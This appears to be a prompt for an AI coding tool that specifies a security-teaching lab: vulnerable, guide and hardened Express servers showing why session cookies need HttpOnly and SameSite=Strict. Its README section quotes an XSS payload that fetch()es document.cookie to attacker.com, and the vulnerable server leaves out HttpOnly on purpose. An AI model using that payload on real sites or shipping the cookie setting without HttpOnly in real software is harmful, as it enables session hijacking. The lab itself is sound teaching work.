# Cursor Prompt — 02: Session Auth
# Ports: 3052 (vulnerable) · 3053 (guide) · 3054 (secure)

Build three Node.js Express servers in `auth-concepts/session/` that teach session cookie security.

---

## File structure to create

```
session/
  session-server.js           ← port 3052, vulnerable
  guide-server.js             ← port 3053, guide
  session-hardened-server.js  ← port 3054, secure
  public/
    index.html                ← NoteKeep login + dashboard SPA (shared)
    style.css
    guide.html
    guide.css
  package.json
```

---

## package.json

```json
{
  "name": "session",
  "scripts": {
    "vulnerable": "node session-server.js",
    "guide": "node guide-server.js",
    "secure": "node session-hardened-server.js",
    "start": "node session-server.js"
  },
  "dependencies": { "express": "^4.18.2", "cors": "^2.8.5" }
}
```

---

## Shared app: NoteKeep (notes app)

**Users:** `alice / pass1234` (fullName: 'Alice Chen'), `bob / qwerty123` (fullName: 'Bob Martinez')

**Notes data (in-memory, same for both servers):**
- `{ id:1, title:'Meeting Notes', body:'Q3 planning: ship auth demo by June', updatedAt:'2026-06-10' }`
- `{ id:2, title:'Grocery List', body:'Milk, eggs, coffee, sourdough', updatedAt:'2026-06-12' }`
- `{ id:3, title:'Project Ideas', body:'Auth concepts lab — 10 mechanisms', updatedAt:'2026-06-14' }`

**Session store:** in-memory `Map`. Session ID = `crypto.randomBytes(32).toString('hex')`. Read from cookie `nk_session`.

---

## session-server.js (port 3052) — vulnerable

Top comment: `* Terminal 1: cd auth-concepts/session && npm install && npm run vulnerable`

**Vulnerability:** session cookie set WITHOUT `HttpOnly` → JavaScript can read `document.cookie` and steal the token.

**Cookie set on login:**
```js
res.setHeader('Set-Cookie', 'nk_session=' + sid + '; Path=/; SameSite=Lax');
// ⚠️ No HttpOnly — JS can read document.cookie
```

**Routes:**
- `POST /api/login` → validate → set cookie → return `{ success: true }`
- `GET /api/me` — requireSession → return `{ username, fullName }`
- `GET /api/notes` — requireSession → return notes
- `POST /api/logout` — requireSession → delete session → clear cookie
- `GET /api/config` → `{ mode: 'vulnerable', port: 3052 }`
- `app.use(express.static(path.join(__dirname, 'public')))`
- Catch-all → `res.sendFile(path.join(__dirname, 'public', 'index.html'))`

---

## session-hardened-server.js (port 3054) — secure

Top comment: `* Terminal 3: cd auth-concepts/session && npm run secure`

**Fix:** cookie set WITH `HttpOnly; SameSite=Strict` → JS cannot read `document.cookie`.

```js
res.setHeader('Set-Cookie', 'nk_session=' + sid + '; Path=/; HttpOnly; SameSite=Strict');
// ✅ HttpOnly — document.cookie returns ""
```

Same routes as vulnerable server. `GET /api/config` → `{ mode: 'secure', port: 3054 }`. Same static file serving.

---

## public/index.html — NoteKeep SPA (shared by both servers)

On load:
1. `fetch('/api/config')` → set banner:
   - vulnerable: orange banner — `⚠ VULNERABLE COOKIE: nk_session set without HttpOnly — JavaScript can read document.cookie`
   - secure: green banner — `✅ HARDENED COOKIE: HttpOnly + SameSite=Strict. document.cookie returns "" — XSS cannot steal this session token.`
2. `fetch('/api/me', { credentials: 'same-origin' })` → if 401 show login form; if 200 show dashboard

**Login form:** username + password inputs → `POST /api/login` → on success reload

**Dashboard:**
- Sidebar: NoteKeep logo, All Notes / Recent / Archived links, Log Out button
- Cookie display box showing `document.cookie` value (demonstrates the vulnerability/protection)
- Notes grid: cards with title, body, updatedAt

**Logout:** `POST /api/logout` → reload

---

## guide-server.js (port 3053) — guide

Top comment: `* Terminal 2: cd auth-concepts/session && npm run guide`

Thin static server serving `public/guide.html`.

**`public/guide.html`** — dark terminal-green theme:
- Title: "Session Auth"
- Target switcher (fixed bottom-left): "Vulnerable Session (3052)" dark slate, "Hardened Session (3054)" green `#16a34a`
- Content: cookie attribute table (HttpOnly, SameSite, Secure, Path, Expires), XSS attack demo walkthrough, what `document.cookie` returns with vs without HttpOnly, cookie lifecycle diagram, the fix.

---

## Inline Comments

Every `// ⚠️` and `// ✅` comment must answer three questions:

1. **What** is wrong (or fixed)
2. **Why** it is exploitable (or why the fix is safe)
3. **How** the attack works mechanically (step by step)

Format:
```js
// ⚠️ VULNERABLE — <one-line summary>
// <explanation: what is wrong, why it matters, how an attacker exploits it>
// <mechanical detail: what the attacker does step by step, what they gain>
const badThing = ...;

// ✅ PROTECTED — <one-line summary>
// <explanation: what the fix does and why it closes the attack vector>
// <mechanical detail: what would need to be true for this to still fail>
const goodThing = ...;
```

**Never shorten an existing comment. Only expand.**
Annotate **vulnerable servers and secure servers only** — never guide servers.

### session

**`session/session-server.js`** — root causes to annotate:
- Cookie set without `HttpOnly`. `document.cookie` in the browser console returns the full session token. Any XSS payload — even a one-liner injected through a stored comment or reflected URL param — can call `document.cookie`, read the token, and `fetch()` it to an attacker-controlled server. The session survives server restart; the attacker's copy is just as valid as the original.
- Missing `SameSite=Strict`: the cookie is sent on cross-site requests, enabling CSRF.

**`session/session-hardened-server.js`** — fixes to annotate:
- `HttpOnly` flag: the browser sends the cookie automatically but blocks all JavaScript access. `document.cookie` returns `""`. XSS payloads cannot exfiltrate what they cannot read.
- `SameSite=Strict`: cookie not sent on cross-site navigations, eliminating CSRF for this session.

---

## README

Follow this canonical section order for this concept's `README.md`. Use `---` between every section:

```
# [Concept Name] — [App Name]
(one-paragraph description)
---
## Port Reference
---
## How It Works
---
## The Vulnerability
---
## The Fix
---
## How to Run
---
## Demo Walkthrough
---
## Hardened Demo
---
## Vulnerable Lines
---
## Defense Details
---
## Credentials   ← only if needed; always last
```

**Section rename mappings:**

| Old name | Canonical name |
|----------|----------------|
| `## How it works` | `## How It Works` |
| `## Vulnerability (port XXXX)` | `## The Vulnerability` |
| `## Fix (port XXXX)` | `## The Fix` |
| `## Run the demo` / `## Run` | `## How to Run` |
| `## Walkthrough` | `## Demo Walkthrough` |
| `## Hardened Demo` / `## Protected Demo` | `## Hardened Demo` |
| `## Key concepts` | `## Defense Details` |
| `## Demo credentials` / `## Demo API keys` | `## Credentials` |
| `## Ports` | `## Port Reference` |

**Script names to fix:**

| Old | Correct |
|-----|---------|
| `npm run basic` | `npm run vulnerable` |
| `npm run session` (in basic-digest) | `npm run secure` |
| `npm run url` | `npm run vulnerable` |
| `npm run header` | `npm run secure` |
| `npm run weak` | `npm run vulnerable` |
| `npm run strong` | `npm run secure` |
| `npm run hardened` | `npm run secure` |
| `npm run session` (in session/) | `npm run vulnerable` |

### Per-concept README instructions — session (NoteKeep)

**`## How It Works`** — expand the ASCII diagram to show both paths:

```
LOGIN:
  POST /api/login { username, password }
          ↓
  sessions.set("a3f9b2c1...", { username: "alice" })
          ↓
  Set-Cookie: nk_session=a3f9b2c1...; Path=/; [HttpOnly]; SameSite=Strict
          ↓
  Browser stores cookie in HTTP-only cookie jar

EVERY SUBSEQUENT REQUEST:
  Cookie: nk_session=a3f9b2c1...   ← browser adds automatically
          ↓
  sessions.get("a3f9b2c1...") → { username: "alice" } → authorized
```

**`## The Vulnerability`** — expand with XSS attack mechanics:

Missing `HttpOnly` flag means JavaScript can read the session cookie.
Any XSS payload — a stored comment, reflected query param, or injected script — can exfiltrate the token:

```js
// Attacker's XSS payload:
fetch('https://attacker.com/steal?c=' + document.cookie);
// Result: attacker receives "nk_session=a3f9b2c1d4e5f6..."
// They can now make authenticated requests as alice from any machine.
```

The session remains valid until the user explicitly logs out. The server has no way to tell
the legitimate user's requests from the attacker's — both send the same cookie.

`document.cookie` returns `"nk_session=a3f9b2c1..."` — any XSS payload can read and exfiltrate it.

Missing `SameSite` also enables CSRF: a form on `attacker.com` can POST to `localhost:3052/api/*`
and the browser will attach the session cookie automatically.

**`## Vulnerable Lines`**:
```js
// ⚠️ VULNERABLE — no HttpOnly flag; JavaScript can read this cookie with document.cookie
// ⚠️ VULNERABLE — SameSite=Lax not Strict; cross-site POST requests still carry this cookie (CSRF possible)
res.setHeader('Set-Cookie', `nk_session=${sid}; Path=/; SameSite=Lax`);
```

**`## Defense Details`** — add three sub-sections:
- `### HttpOnly — blocks JavaScript access` — HttpOnly is a browser instruction, not server enforcement. The cookie is still sent automatically on every request; JS simply cannot read it via `document.cookie`. XSS payloads cannot exfiltrate what they cannot read.
- `### SameSite=Strict — blocks cross-site sending` — `Lax` allows GET navigations from external sites (e.g. clicking a link in email). `Strict` blocks even those — cookie only sent on requests initiated from the same site. Eliminates CSRF.
- `### Why this isn't a complete defense` — HttpOnly + SameSite stops cookie theft via `document.cookie` and CSRF via cross-site form submission, but doesn't stop an attacker who already has XSS from making authenticated `fetch()` calls directly (same-origin). Defense-in-depth requires CSP, output encoding, and parameterized queries too.

**`## Hardened Demo`**:
1. Open `localhost:3054` — login as `alice / pass1234`
2. Run `document.cookie` in DevTools console — returns `""` (HttpOnly blocks it)
3. The dashboard still loads correctly — the browser sends the cookie automatically
4. Open `localhost:3052` — same flow — `document.cookie` returns the full `nk_session=...` string
